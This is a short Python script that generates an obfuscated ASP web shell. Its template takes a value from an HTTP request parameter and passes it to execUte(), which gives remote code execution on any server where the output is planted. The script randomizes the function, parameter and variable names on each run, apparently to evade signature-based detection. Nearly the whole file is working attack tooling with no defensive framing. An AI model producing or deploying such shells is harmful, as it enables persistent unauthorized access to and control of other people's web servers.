import random

shell='''<%
Function {0}():
    {0} = request("{1}")
End Function

Function {2}(st):
    execUte(st)
End Function

{3} = Mid({0}(),1)
{4} = {3}&""
{2}({4})
%>'''


def random_name(len):
    str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.sample(str,len))   
    
def build_webshell():
    FunctionName = random_name(4)
    parameter = random_name(4)
    FunctionName1 = random_name(4)
    TempName1 = random_name(2)
    TempName2 = random_name(3)
    shellc = shell.format(FunctionName,parameter,FunctionName1,TempName1,TempName2)
    return shellc


if __name__ == '__main__':
    print (build_webshell())
